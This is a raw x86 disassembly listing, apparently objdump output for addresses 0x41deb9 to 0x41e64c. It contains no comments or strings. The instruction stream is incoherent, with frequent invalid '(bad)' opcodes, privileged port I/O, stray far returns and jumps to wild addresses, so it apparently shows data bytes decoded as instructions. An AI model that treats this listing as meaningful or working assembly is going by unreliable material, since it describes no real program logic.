  41deb9:	sbb    ebx,DWORD PTR [edx-0x19]
  41debc:	loopne 0x41df17
  41debe:	into   
  41debf:	sbb    eax,0x23b3d679
  41dec4:	fisttp WORD PTR [ebp+0x45]
  41dec7:	jg     0x41de9b
  41dec9:	loope  0x41dee6
  41decb:	imul   ebx,DWORD PTR [ebp+0xc4dc077],0x6f
  41ded2:	stos   BYTE PTR es:[edi],al
  41ded3:	inc    eax
  41ded4:	jb     0x41de98
  41ded6:	xchg   ebx,eax
  41ded7:	xor    ebp,esi
  41ded9:	xor    ecx,edx
  41dedb:	inc    edx
  41dedc:	mov    esi,0x67b3252
  41dee1:	cmp    dl,BYTE PTR [edi+edi*2+0x21501f77]
  41dee8:	or     al,0xaa
  41deea:	int    0x29
  41deec:	popa   
  41deed:	iret   
  41deee:	ret    
  41deef:	jae    0x41de9f
  41def1:	imul   esp,ecx,0x7a914275
  41def7:	inc    ebx
  41def8:	dec    edx
  41def9:	sub    bl,BYTE PTR [ecx-0x5]
  41defc:	mov    ecx,0x32ca8d6a
  41df01:	daa    
  41df02:	adc    dh,dl
  41df04:	test   eax,0x787c5d8d
  41df09:	lahf   
  41df0a:	sahf   
  41df0b:	pop    ds
  41df0c:	sahf   
  41df0d:	pop    eax
  41df0e:	xchg   edi,eax
  41df0f:	pop    esp
  41df10:	mov    edi,0x95aef234
  41df15:	jns    0x41deea
  41df17:	das    
  41df18:	shl    DWORD PTR [ebp-0x5f],0xbf
  41df1c:	mov    ds:0x68ab9732,al
  41df21:	aas    
  41df22:	add    BYTE PTR [edx-0x17],cl
  41df25:	clc    
  41df26:	test   edx,ebx
  41df28:	push   esi
  41df29:	xchg   esp,eax
  41df2a:	dec    ebp
  41df2b:	jmp    0x989efeb9
  41df30:	leave  
  41df31:	or     DWORD PTR [eax],0x58e156a4
  41df37:	inc    esp
  41df38:	dec    esi
  41df39:	xchg   edi,eax
  41df3a:	xor    dh,ch
  41df3c:	sub    eax,0x2e41a47f
  41df41:	or     BYTE PTR ds:0x38c68739,ah
  41df47:	and    eax,0xedc182e9
  41df4c:	xor    DWORD PTR [esp+eax*1+0x215376ef],ebx
  41df53:	retf   
  41df54:	ret    
  41df55:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41df56:	cmp    bh,BYTE PTR [ecx+0x1b9259fc]
  41df5c:	add    dh,ah
  41df5e:	and    BYTE PTR [edi+0x69],bh
  41df61:	pop    esi
  41df62:	movlps xmm2,QWORD PTR [ecx+0x2b]
  41df66:	retfw  
  41df68:	iret   
  41df69:	xor    eax,0xd914d71d
  41df6e:	cdq    
  41df6f:	cmp    eax,0xf37bd57d
  41df74:	xchg   edx,eax
  41df75:	and    DWORD PTR [eax],0x8f8262b1
  41df7b:	into   
  41df7c:	xchg   edi,eax
  41df7d:	fmulp  st(4),st
  41df7f:	rcr    DWORD PTR [ebx-0x60],1
  41df82:	and    BYTE PTR [esi],bl
  41df84:	cmp    eax,0x241e1c1b
  41df89:	or     ah,cl
  41df8b:	rcr    DWORD PTR [ecx+0xc],0xa6
  41df8f:	fcom   st(2)
  41df91:	mov    ch,0x75
  41df93:	scas   al,BYTE PTR es:[edi]
  41df94:	stos   DWORD PTR es:[edi],eax
  41df95:	mov    dl,0x7e
  41df97:	xor    eax,0x8b29748a
  41df9c:	push   esp
  41df9d:	and    eax,0xf6e3ce85
  41dfa2:	jg     0x41df2b
  41dfa4:	jl     0x41df87
  41dfa6:	loope  0x41df4e
  41dfa8:	icebp  
  41dfa9:	ja     0x41df4a
  41dfab:	out    dx,al
  41dfac:	jle    0x41e027
  41dfae:	mov    edx,DWORD PTR [eax+0x1d]
  41dfb1:	lea    edi,[ebp-0x7603ba39]
  41dfb7:	and    DWORD PTR [edx+edi*4],esp
  41dfba:	gs mov ecx,0x70bb8aae
  41dfc0:	jl     0x41dfdd
  41dfc2:	and    eax,DWORD PTR [eax+0x38]
  41dfc5:	mov    dh,BYTE PTR [esi-0x7c]
  41dfc8:	sbb    ecx,DWORD PTR [edi]
  41dfca:	dec    edi
  41dfcb:	scas   al,BYTE PTR es:[edi]
  41dfcc:	push   ebp
  41dfcd:	xor    DWORD PTR [ebp+eiz*4-0x55],ecx
  41dfd1:	je     0x41dff5
  41dfd3:	stc    
  41dfd4:	sbb    al,0xe8
  41dfd6:	test   eax,0xbbc16ea6
  41dfdb:	pop    eax
  41dfdc:	xchg   edi,eax
  41dfdd:	ins    DWORD PTR es:[edi],dx
  41dfde:	dec    edi
  41dfdf:	add    ebx,DWORD PTR [ebp+0xf1dfeb3]
  41dfe5:	popf   
  41dfe6:	retf   
  41dfe7:	xor    eax,0xafae0a58
  41dfec:	and    edx,0xc73da969
  41dff2:	dec    ebp
  41dff3:	push   edi
  41dff4:	std    
  41dff5:	jb     0x41dfe3
  41dff7:	ss jecxz 0x41dfa9
  41dffa:	jmp    0x2f8abadb
  41dfff:	push   ds
  41e000:	inc    edx
  41e001:	(bad)  
  41e003:	add    BYTE PTR [edx+edx*8+0x19],bl
  41e007:	(bad)  
  41e008:	fild   DWORD PTR [eax+0x43170023]
  41e00e:	in     eax,dx
  41e00f:	mov    cs,WORD PTR [ecx]
  41e011:	fstp   DWORD PTR [eax-0x4ed2e116]
  41e017:	out    0xf9,al
  41e019:	int    0x26
  41e01b:	dec    edx
  41e01c:	add    eax,0xd1e4cf58
  41e021:	mov    al,BYTE PTR [ebx+0x0]
  41e024:	mov    DWORD PTR cs:[esi+0x131b3fc5],ecx
  41e02b:	or     DWORD PTR [eax],esp
  41e02d:	in     eax,0x74
  41e02f:	cmp    esi,edi
  41e031:	fwait
  41e032:	and    ch,ch
  41e034:	mov    eax,ds:0x10f104c
  41e03a:	mov    BYTE PTR ds:0xdba3f018,cl
  41e040:	lods   al,BYTE PTR ds:[esi]
  41e041:	lods   eax,DWORD PTR ds:[esi]
  41e042:	jmp    0xb66a098a
  41e047:	jne    0x41dfe8
  41e049:	nop
  41e04a:	inc    esp
  41e04b:	sub    DWORD PTR [ecx],ecx
  41e04d:	and    bl,dl
  41e04f:	fisub  WORD PTR [ebx+ebx*8-0x46]
  41e053:	imul   ebp,esp,0xe2b51996
  41e059:	lods   al,BYTE PTR ds:[esi]
  41e05a:	daa    
  41e05b:	mov    edi,0x5420550a
  41e060:	loop   0x41e01f
  41e062:	cmp    DWORD PTR [edi-0x4bdbb771],ebx
  41e068:	ret    0x6a78
  41e06b:	xor    esi,DWORD PTR [edx-0x7f40a61f]
  41e071:	std    
  41e072:	sbb    eax,0x3ff14f60
  41e077:	and    eax,DWORD PTR [edi]
  41e079:	out    dx,eax
  41e07a:	push   ss
  41e07b:	push   cs
  41e07c:	call   0xfe6b5212
  41e081:	fild   WORD PTR [esi+ebx*4+0x65]
  41e085:	shl    BYTE PTR [edx+eax*2-0x27],1
  41e089:	fnstenv [ecx+ebp*8]
  41e08c:	clc    
  41e08d:	and    DWORD PTR [ebx],edx
  41e08f:	xor    DWORD PTR [esi],0xffffff81
  41e092:	cld    
  41e093:	add    ecx,DWORD PTR ds:[esi]
  41e096:	pop    edi
  41e097:	mov    ebx,0x3fcb3a1f
  41e09c:	push   0x36
  41e09e:	sub    BYTE PTR [edx-0x1187606b],ch
  41e0a4:	les    eax,FWORD PTR [edi+0x6bd45bf0]
  41e0aa:	dec    ecx
  41e0ab:	xchg   esp,eax
  41e0ac:	shl    esi,1
  41e0ae:	jl     0x41e108
  41e0b0:	inc    ebp
  41e0b1:	cdq    
  41e0b2:	xchg   DWORD PTR [esi-0x69854187],ebx
  41e0b8:	sub    edi,DWORD PTR [esi]
  41e0ba:	or     bl,ch
  41e0bc:	push   ebx
  41e0bd:	push   es
  41e0be:	aas    
  41e0bf:	rcr    DWORD PTR [edx],0x70
  41e0c2:	bound  edx,QWORD PTR [ebp-0x3273c748]
  41e0c8:	aam    0x47
  41e0ca:	push   0x39f930a0
  41e0cf:	push   ds
  41e0d0:	adc    al,0x5b
  41e0d2:	mul    BYTE PTR [ecx+esi*4+0x62d47bc1]
  41e0d9:	mov    ebx,0x130e0dda
  41e0de:	mov    BYTE PTR [esi-0x46],ah
  41e0e1:	ja     0x41e11a
  41e0e3:	pop    ecx
  41e0e4:	mov    BYTE PTR [ebx+0x7b72fa9f],al
  41e0ea:	dec    eax
  41e0eb:	mov    dl,0x18
  41e0ed:	mov    fs,esi
  41e0ef:	cmp    eax,0x7b473348
  41e0f4:	sbb    cl,BYTE PTR [esi-0x2916dc6f]
  41e0fa:	push   edx
  41e0fb:	mov    al,0xfe
  41e0fd:	and    bl,BYTE PTR [ecx+0x3b27160f]
  41e103:	add    DWORD PTR [edi+0x4556a2a3],ebp
  41e109:	push   ss
  41e10a:	imul   esi,edx,0xffffffd5
  41e10d:	in     al,dx
  41e10e:	in     eax,dx
  41e10f:	jae    0x41e178
  41e111:	push   esi
  41e112:	ja     0x41e14d
  41e114:	jnp    0x41e0ab
  41e116:	test   dl,0x65
  41e119:	pop    ebx
  41e11a:	dec    ebx
  41e11b:	fsub   DWORD PTR [eax+0x2c]
  41e11e:	pop    es
  41e11f:	push   0xbf9692db
  41e124:	jns    0x41e13d
  41e126:	cmp    DWORD PTR [edi-0x22],esi
  41e129:	in     al,dx
  41e12a:	lahf   
  41e12b:	fdivr  st(4),st
  41e12d:	adc    edi,edi
  41e12f:	sti    
  41e130:	shl    DWORD PTR [edi+0x75],0xae
  41e134:	push   ebp
  41e135:	cs fabs 
  41e138:	stc    
  41e139:	(bad)  
  41e13a:	adc    eax,DWORD PTR [edi-0x5b4d5706]
  41e140:	fistp  DWORD PTR ds:0xc04f52b
  41e146:	push   esi
  41e147:	ds ret 0x9245
  41e14b:	sahf   
  41e14c:	jmp    0x41e147
  41e14e:	outs   dx,DWORD PTR ds:[esi]
  41e14f:	pop    ebp
  41e150:	mov    eax,0x5c76db3c
  41e155:	cwde   
  41e156:	ret    
  41e157:	lock and BYTE PTR [edx+0x380aaa80],bl
  41e15e:	mov    DWORD PTR [edx+0x4802477b],ebp
  41e164:	retf   
  41e165:	scas   al,BYTE PTR es:[edi]
  41e166:	sub    al,0x63
  41e168:	sub    BYTE PTR [ebx-0xaff042e],bh
  41e16e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e16f:	cld    
  41e170:	in     eax,dx
  41e171:	jl     0x41e14f
  41e173:	sub    edx,esi
  41e175:	mov    ch,0x7
  41e177:	iret   
  41e178:	cli    
  41e179:	sub    dh,BYTE PTR [ecx+0x7ad65ee4]
  41e17f:	lock inc ebp
  41e181:	push   ebp
  41e182:	push   ss
  41e183:	jb     0x41e1f1
  41e185:	cmp    BYTE PTR [eax],dl
  41e187:	test   al,0xd1
  41e189:	iret   
  41e18a:	cdq    
  41e18b:	ret    
  41e18c:	mov    dh,0x3e
  41e18e:	or     BYTE PTR [ebx+0x799c0921],0x69
  41e195:	test   BYTE PTR [edx+0x6c],dh
  41e198:	push   ebp
  41e199:	xchg   dl,ah
  41e19b:	and    bl,BYTE PTR [esi-0x1a1d77bf]
  41e1a1:	(bad)  
  41e1a2:	sub    cl,al
  41e1a4:	mov    bh,0xb3
  41e1a6:	mov    dh,bl
  41e1a8:	sbb    DWORD PTR [ebp+0x6fc368c8],edx
  41e1ae:	pop    ds
  41e1af:	and    dh,BYTE PTR es:[ebx]
  41e1b2:	or     BYTE PTR [edi-0x13f9fb78],bl
  41e1b8:	(bad)  
  41e1b9:	fbstp  TBYTE PTR [edi+0x64]
  41e1bc:	jmp    0xfc59726e
  41e1c1:	mov    esp,0x82ac5589
  41e1c6:	jmp    0x41e1e7
  41e1c8:	pop    esi
  41e1c9:	scas   eax,DWORD PTR es:[edi]
  41e1ca:	pop    esi
  41e1cb:	inc    ebp
  41e1cc:	push   eax
  41e1cd:	cdq    
  41e1ce:	cmp    al,0x8c
  41e1d0:	push   cs
  41e1d1:	adc    BYTE PTR [edi+0x55],0x5f
  41e1d5:	mov    edi,0x2e450b19
  41e1da:	das    
  41e1db:	pop    esi
  41e1dc:	in     al,0x88
  41e1de:	push   ecx
  41e1df:	fsub   QWORD PTR [ecx+ebp*4-0x22]
  41e1e3:	sbb    ch,al
  41e1e5:	into   
  41e1e6:	test   eax,0x34d6f854
  41e1eb:	inc    edi
  41e1ec:	aas    
  41e1ed:	mov    ebp,0x3709261b
  41e1f2:	lods   al,BYTE PTR ds:[esi]
  41e1f3:	ins    DWORD PTR es:[edi],dx
  41e1f4:	lock out 0x8a,al
  41e1f7:	loop   0x41e248
  41e1f9:	mov    cl,0x5b
  41e1fb:	or     al,0x98
  41e1fd:	out    0xc5,al
  41e1ff:	out    dx,al
  41e200:	push   ebx
  41e201:	into   
  41e202:	add    al,0x98
  41e204:	xchg   esi,eax
  41e205:	mov    ds:0x23f94a78,eax
  41e20a:	fadd   DWORD PTR [esi]
  41e20c:	imul   ecx,DWORD PTR [edx+0xc],0xffffffa6
  41e210:	(bad)  
  41e211:	and    BYTE PTR [ebx+0x329fd52d],dl
  41e217:	mov    esi,0xb236c673
  41e21c:	aas    
  41e21d:	inc    esi
  41e21e:	inc    esi
  41e21f:	inc    ebp
  41e220:	mov    edx,0x77f4604b
  41e225:	sub    al,0x67
  41e227:	iret   
  41e228:	iret   
  41e229:	push   ecx
  41e22a:	mov    esp,0x4d27e0ac
  41e22f:	pusha  
  41e230:	pop    eax
  41e231:	lods   al,BYTE PTR ds:[esi]
  41e232:	shr    DWORD PTR [eax+0x22],cl
  41e235:	fnstsw WORD PTR [eax+eax*2+0x54ed3e50]
  41e23c:	leave  
  41e23d:	bound  esi,QWORD PTR [ecx-0x5ab2ca3b]
  41e243:	cmp    cl,cl
  41e245:	xchg   ecx,eax
  41e246:	xlat   BYTE PTR ds:[ebx]
  41e247:	retfw  0x5b9e
  41e24b:	mov    esi,DWORD PTR [ebx-0x240b00ba]
  41e251:	cmp    ecx,ecx
  41e253:	aaa    
  41e254:	jp     0x41e1d9
  41e256:	in     al,0xcd
  41e258:	enter  0xaf80,0xf2
  41e25c:	shl    esp,0xeb
  41e25f:	inc    eax
  41e260:	pop    ss
  41e261:	mov    es,WORD PTR [ebx-0x44]
  41e264:	or     BYTE PTR [ebp*8+0x4d9d0208],ah
  41e26b:	retf   0xad77
  41e26e:	popf   
  41e26f:	shl    DWORD PTR [ecx+0x21],1
  41e272:	ret    0x9206
  41e275:	mov    ch,0x80
  41e277:	mov    al,0xd7
  41e279:	add    BYTE PTR [eax+0x4e3beea],0x80
  41e280:	inc    edx
  41e281:	pop    ebx
  41e282:	repnz mov cl,BYTE PTR [ebp+0x5ee0c01e]
  41e289:	lock mov ebp,0x8a8a5c42
  41e28f:	fdiv   QWORD PTR [esi-0x31c72985]
  41e295:	inc    eax
  41e296:	lods   eax,DWORD PTR ds:[esi]
  41e297:	mov    ds:0x4bbfd42f,eax
  41e29c:	inc    esp
  41e29d:	sbb    DWORD PTR [eax+0x4c],esp
  41e2a0:	outs   dx,DWORD PTR ds:[esi]
  41e2a1:	dec    eax
  41e2a2:	jne    0x41e2d6
  41e2a4:	xor    ebp,edi
  41e2a6:	into   
  41e2a7:	sbb    al,ch
  41e2a9:	stos   DWORD PTR es:[edi],eax
  41e2aa:	pusha  
  41e2ab:	fdiv   DWORD PTR [esi-0x9]
  41e2ae:	sbb    dh,BYTE PTR [ecx]
  41e2b0:	cmp    edi,DWORD PTR [esi]
  41e2b2:	inc    ebp
  41e2b3:	shl    BYTE PTR fs:[edx+0x1d],0xa3
  41e2b8:	xchg   esp,eax
  41e2b9:	or     al,0xb0
  41e2bb:	mov    bh,0x22
  41e2bd:	ucomiss xmm7,DWORD PTR [edx-0x15e247f2]
  41e2c4:	or     cl,dl
  41e2c6:	pop    ds
  41e2c7:	ja     0x41e2e8
  41e2c9:	gs pop edx
  41e2cb:	dec    ecx
  41e2cc:	mov    edx,0xe95168c4
  41e2d1:	ret    0xa62c
  41e2d4:	retf   0xede
  41e2d7:	xor    eax,0x60c878b8
  41e2dc:	cmp    eax,0xf755f170
  41e2e1:	xchg   BYTE PTR [edi-0x4b6440d4],ch
  41e2e7:	add    eax,0x2ac327d9
  41e2ec:	sbb    eax,DWORD PTR [ecx]
  41e2ee:	xor    al,0xe5
  41e2f0:	mov    al,0xf5
  41e2f2:	mov    eax,0x6eea767e
  41e2f7:	adc    edi,DWORD PTR [edx-0x13dbd50c]
  41e2fd:	das    
  41e2fe:	mov    esp,es
  41e300:	mov    eax,0xb3c663c
  41e305:	and    ebx,ebx
  41e307:	and    BYTE PTR [ebx-0x61d0f80f],bh
  41e30d:	test   eax,0x470a7bff
  41e312:	inc    ebx
  41e313:	xchg   esi,eax
  41e314:	in     eax,0xad
  41e316:	dec    edi
  41e317:	sub    bh,BYTE PTR [edx]
  41e319:	pusha  
  41e31a:	cmp    ebx,DWORD PTR [eax-0x4f]
  41e31d:	add    BYTE PTR [esi],al
  41e31f:	jle    0x41e31b
  41e321:	inc    ebx
  41e322:	nop
  41e323:	push   edi
  41e324:	retf   0xd100
  41e327:	nop
  41e328:	scas   eax,DWORD PTR es:[edi]
  41e329:	fucomp st(5)
  41e32b:	les    ebp,FWORD PTR [edx+0x62]
  41e32e:	sub    dl,bh
  41e330:	mov    ebx,0x99dec21c
  41e335:	retf   0xc827
  41e338:	(bad)  
  41e339:	or     eax,0xb4923452
  41e33e:	loope  0x41e30c
  41e340:	pushf  
  41e341:	imul   eax,DWORD PTR [edx-0x271bd0e9],0x64
  41e348:	stos   BYTE PTR es:[edi],al
  41e349:	aas    
  41e34a:	in     eax,0xa7
  41e34c:	(bad)  
  41e34e:	call   0xe99d5a26
  41e353:	fild   QWORD PTR [eax+0x72]
  41e356:	mov    ds:0x755cb3fa,eax
  41e35b:	mov    ch,0x46
  41e35d:	push   eax
  41e35e:	mov    ebx,0x870610d0
  41e363:	imul   DWORD PTR [eax-0x3b]
  41e366:	pop    ds
  41e367:	jg     0x41e305
  41e369:	sbb    al,0x6
  41e36b:	mov    dl,0xb5
  41e36d:	jecxz  0x41e329
  41e36f:	xchg   ebx,eax
  41e370:	sub    cl,0x4c
  41e373:	gs ret 
  41e375:	(bad)  
  41e376:	pop    edi
  41e377:	lea    esi,[ebp+0x34fb7c91]
  41e37d:	dec    eax
  41e37e:	pop    eax
  41e37f:	retf   
  41e380:	mov    dh,0x29
  41e382:	mov    esp,esp
  41e384:	sub    cl,BYTE PTR [edx+0x17060d9c]
  41e38a:	and    eax,0xd83a2440
  41e38f:	ins    BYTE PTR es:[edi],dx
  41e390:	sbb    ah,BYTE PTR [edx-0x35fc5192]
  41e396:	push   ss
  41e397:	xchg   ebx,eax
  41e398:	pop    ebx
  41e399:	add    eax,0x4ffc69c0
  41e39e:	rol    bh,1
  41e3a0:	and    BYTE PTR [edi],dl
  41e3a2:	cmp    al,0x32
  41e3a4:	xor    DWORD PTR [ecx+ecx*4],edx
  41e3a7:	jecxz  0x41e416
  41e3a9:	sub    ebp,DWORD PTR [edi+0x28e0d335]
  41e3af:	repz lea esp,[ebp+0x75f41433]
  41e3b6:	jl     0x41e404
  41e3b8:	mov    ebp,0xe38e81a6
  41e3bd:	push   ds
  41e3be:	sbb    ax,WORD PTR [eax+ebp*4]
  41e3c2:	fldz   
  41e3c4:	cld    
  41e3c5:	sub    dh,dh
  41e3c7:	sahf   
  41e3c8:	inc    edx
  41e3c9:	lods   eax,DWORD PTR ds:[esi]
  41e3ca:	fimul  DWORD PTR [esi-0x22]
  41e3cd:	cmp    dl,BYTE PTR [esi+0x45]
  41e3d0:	outs   dx,DWORD PTR ds:[esi]
  41e3d1:	ss push edx
  41e3d3:	call   0x6ecc7fc6
  41e3d8:	inc    eax
  41e3d9:	and    esi,DWORD PTR [ebx-0x4f]
  41e3dc:	xchg   DWORD PTR [edx+eax*8-0x21],edx
  41e3e0:	(bad)  
  41e3e1:	retf   0x1b8
  41e3e4:	pop    eax
  41e3e5:	xor    dh,BYTE PTR [eax+ebx*1]
  41e3e8:	aas    
  41e3e9:	sub    al,0xbb
  41e3eb:	sub    DWORD PTR [ecx-0x48755a37],0x44
  41e3f2:	or     eax,0x1c08336b
  41e3f7:	in     eax,0x18
  41e3f9:	push   ds
  41e3fa:	mov    bl,0x7b
  41e3fc:	jl     0x41e3c8
  41e3fe:	pop    ss
  41e3ff:	or     DWORD PTR [edi+0x45],0x3e
  41e403:	clc    
  41e404:	mul    DWORD PTR [ecx+edx*8+0x77]
  41e408:	pop    esp
  41e409:	imul   edi,esp,0x26
  41e40c:	pop    ds
  41e40d:	lock shl BYTE PTR [eax-0x21],1
  41e411:	cld    
  41e412:	xor    bh,dl
  41e414:	sub    eax,0xcc9b9887
  41e419:	adc    BYTE PTR [ecx-0x1f],al
  41e41c:	push   eax
  41e41d:	cmp    DWORD PTR [esi],0xc09041dc
  41e423:	cdq    
  41e424:	push   esp
  41e425:	push   esi
  41e426:	dec    ebp
  41e427:	xchg   BYTE PTR [ebp+0x61051809],ah
  41e42d:	rcr    BYTE PTR [esi+0x2ad52a1c],1
  41e433:	loop   0x41e3cc
  41e435:	mov    ah,0x6f
  41e437:	retf   
  41e438:	and    DWORD PTR [ebp+0x56],ebx
  41e43b:	sub    eax,eax
  41e43d:	in     eax,0xeb
  41e43f:	pop    edx
  41e440:	retf   
  41e441:	cdq    
  41e442:	dec    ebx
  41e443:	xchg   DWORD PTR [ebx],edx
  41e445:	cmp    DWORD PTR [ebp-0x4c],edi
  41e448:	sbb    al,0x3f
  41e44a:	mov    ds:0x793215fe,eax
  41e44f:	es clc 
  41e451:	jl     0x41e43f
  41e453:	in     eax,0x58
  41e455:	das    
  41e456:	and    dl,ch
  41e458:	sbb    ecx,eax
  41e45a:	pop    ds
  41e45b:	push   ecx
  41e45c:	adc    dl,bh
  41e45e:	aaa    
  41e45f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e460:	(bad)  
  41e461:	cmp    al,0x3d
  41e463:	dec    eax
  41e464:	fidiv  DWORD PTR gs:[ecx+0x72]
  41e468:	js     0x41e486
  41e46a:	cmp    BYTE PTR [edx+0x5237f9cc],ch
  41e470:	out    dx,eax
  41e471:	push   0xffffffb7
  41e473:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e474:	add    edi,DWORD PTR [edi]
  41e476:	xor    al,0xd5
  41e478:	fidivr DWORD PTR [esi-0x7b]
  41e47b:	jp     0x41e4f4
  41e47d:	jbe    0x41e475
  41e47f:	mov    edi,0x131218d1
  41e484:	push   es
  41e485:	jbe    0x41e41d
  41e487:	in     eax,0xd4
  41e489:	outs   dx,DWORD PTR ds:[esi]
  41e48a:	sti    
  41e48b:	std    
  41e48c:	int3   
  41e48d:	adc    esi,edi
  41e48f:	test   DWORD PTR [esi],edx
  41e491:	jmp    0x21d3eb41
  41e496:	cld    
  41e497:	xchg   ebx,eax
  41e498:	imul   edx,DWORD PTR [eax+0x1fe40980],0xfacc9579
  41e4a2:	shl    ebx,1
  41e4a4:	pop    ds
  41e4a5:	fisubr DWORD PTR [edx]
  41e4a7:	les    ecx,FWORD PTR [esi]
  41e4a9:	mov    esi,0x8eb175a5
  41e4ae:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e4af:	inc    edi
  41e4b0:	rcr    DWORD PTR [ecx-0x1d],cl
  41e4b3:	fsubr  DWORD PTR [eax+0x3218e0bd]
  41e4b9:	test   BYTE PTR [edi-0x119a6697],0x45
  41e4c0:	xchg   edx,eax
  41e4c1:	push   ebp
  41e4c2:	xchg   esp,eax
  41e4c3:	out    dx,eax
  41e4c4:	gs mov ch,0x29
  41e4c7:	scas   al,BYTE PTR es:[edi]
  41e4c8:	fsub   QWORD PTR [ebx-0x26]
  41e4cb:	lds    esp,FWORD PTR [ebx]
  41e4cd:	loopne 0x41e463
  41e4cf:	push   0x72
  41e4d1:	adc    eax,0x613c69ad
  41e4d6:	(bad)  
  41e4d7:	cmp    eax,0xf96d1122
  41e4dc:	cs jae 0x41e4d1
  41e4df:	(bad)  
  41e4e0:	cmc    
  41e4e1:	ret    0x501
  41e4e4:	lea    esp,[ebx]
  41e4e6:	push   ebp
  41e4e7:	outs   dx,BYTE PTR ds:[esi]
  41e4e8:	call   0x328c508
  41e4ed:	mov    ds:0x42e064cb,eax
  41e4f2:	or     bl,BYTE PTR [ecx]
  41e4f4:	jne    0x41e50f
  41e4f6:	mov    DWORD PTR [esi-0x26],edi
  41e4f9:	loope  0x41e574
  41e4fb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e4fc:	lods   eax,DWORD PTR ds:[esi]
  41e4fd:	in     eax,0x8c
  41e4ff:	es (bad) 
  41e501:	loopne 0x41e533
  41e503:	jge    0x41e4b3
  41e505:	adc    eax,0x17fe4e79
  41e50a:	push   eax
  41e50b:	ss mov ebx,0xb8e69d43
  41e511:	test   al,0xc3
  41e513:	dec    ebp
  41e514:	jo     0x41e512
  41e516:	iret   
  41e517:	rcr    BYTE PTR [ebx],1
  41e519:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e51a:	aaa    
  41e51b:	ins    DWORD PTR es:[edi],dx
  41e51c:	in     eax,0xff
  41e51e:	push   ecx
  41e51f:	push   ss
  41e520:	add    esp,DWORD PTR [ebx+ecx*2]
  41e523:	adc    eax,0xa8404a45
  41e528:	clc    
  41e529:	push   ecx
  41e52a:	adc    edx,ebx
  41e52c:	mov    al,0x3f
  41e52e:	jns    0x41e5a6
  41e530:	push   0x7f
  41e532:	ror    BYTE PTR [ecx-0x54],1
  41e535:	pusha  
  41e536:	aas    
  41e537:	xlat   BYTE PTR ds:[ebx]
  41e538:	inc    eax
  41e539:	(bad)  
  41e53a:	leave  
  41e53b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e53c:	cwde   
  41e53d:	stos   DWORD PTR es:[edi],eax
  41e53e:	push   esi
  41e53f:	push   0x951df178
  41e544:	add    al,0x7e
  41e546:	pop    edi
  41e547:	sahf   
  41e548:	or     ebx,DWORD PTR [ecx]
  41e54a:	jp     0x41e58b
  41e54c:	jl     0x41e5cb
  41e54e:	test   eax,0x341877ac
  41e553:	imul   ebx,DWORD PTR [ebx+0x427f04e],0xffffff9f
  41e55a:	jo     0x41e568
  41e55c:	mov    cl,0x5a
  41e55e:	mov    bl,0x1f
  41e560:	popa   
  41e561:	or     BYTE PTR [ecx-0xdf5822],dl
  41e567:	mov    edi,0x7c0740c8
  41e56c:	jbe    0x41e5dc
  41e56e:	or     edx,esi
  41e570:	inc    edi
  41e571:	sub    BYTE PTR [edi+edx*2+0x380c4929],0xf1
  41e579:	xchg   esp,eax
  41e57a:	dec    ecx
  41e57b:	push   0xf718d44b
  41e580:	sub    al,0x6f
  41e582:	cli    
  41e583:	jp     0x41e51f
  41e585:	and    eax,0x29b091f6
  41e58a:	fs add ch,bl
  41e58d:	cmp    BYTE PTR [edx+0x51],cl
  41e590:	push   es
  41e591:	pusha  
  41e592:	sbb    eax,0x8e91388a
  41e597:	xchg   esp,eax
  41e598:	xor    DWORD PTR [eax],edx
  41e59a:	and    BYTE PTR [ebp+0x162fb727],0x63
  41e5a1:	arpl   WORD PTR [edi-0x53729b6e],si
  41e5a7:	add    DWORD PTR [ebx],edx
  41e5a9:	mov    cl,BYTE PTR [ecx]
  41e5ab:	add    eax,0x67374a6e
  41e5b0:	out    0x18,al
  41e5b2:	ins    DWORD PTR es:[edi],dx
  41e5b3:	mov    ah,0x80
  41e5b5:	(bad)  
  41e5b6:	ja     0x41e53a
  41e5b8:	xchg   ebx,eax
  41e5b9:	ss adc eax,0x4d0e0171
  41e5bf:	cdq    
  41e5c0:	sbb    DWORD PTR [esi-0x7f1f5fa1],edx
  41e5c6:	xchg   ecx,eax
  41e5c7:	and    dl,BYTE PTR [ecx+0xa]
  41e5ca:	in     al,0x27
  41e5cc:	dec    eax
  41e5cd:	test   eax,0x361129b8
  41e5d2:	(bad)  
  41e5d3:	mov    esi,0xd7f47771
  41e5d8:	or     eax,0xd6443aaa
  41e5dd:	scas   eax,DWORD PTR es:[edi]
  41e5de:	retf   0xb0cf
  41e5e1:	cmp    BYTE PTR [ecx-0x6a4c3842],ch
  41e5e7:	rol    esi,cl
  41e5e9:	pop    eax
  41e5ea:	sub    BYTE PTR [eax-0x5c],dl
  41e5ed:	cbw    
  41e5ef:	int3   
  41e5f0:	bswap  edi
  41e5f2:	or     al,0x45
  41e5f4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e5f5:	xchg   ch,dl
  41e5f7:	inc    edx
  41e5f8:	aaa    
  41e5f9:	xchg   edx,eax
  41e5fa:	cmp    cl,BYTE PTR [ebx]
  41e5fc:	call   0x5c5a:0x8906771e
  41e603:	mov    ebx,0x7d68e821
  41e608:	inc    edx
  41e609:	add    DWORD PTR [eax+edx*4-0x66],0x1e
  41e60e:	imul   DWORD PTR [eax+0x58db37c2]
  41e614:	inc    edx
  41e615:	iret   
  41e616:	mov    ah,0x61
  41e618:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e619:	sub    cl,0x66
  41e61c:	dec    edx
  41e61d:	and    esi,DWORD PTR [edx+0x7e70ee7d]
  41e623:	sub    eax,0xfe85986c
  41e628:	mov    esp,0xd05ce28e
  41e62d:	push   ss
  41e62e:	dec    ecx
  41e62f:	(bad)
  41e632:	xchg   DWORD PTR [edx-0x576ceec8],ecx
  41e638:	shr    BYTE PTR [ebx-0x7e],cl
  41e63b:	cdq    
  41e63c:	pop    ss
  41e63d:	jge    0x41e5f9
  41e63f:	pop    ebx
  41e640:	add    DWORD PTR [esi-0x38],edi
  41e643:	pop    esi
  41e644:	dec    eax
  41e646:	and    eax,0x3839984e
  41e64b:	out    dx,eax
  41e64c:	fcmovnb st,st(6)
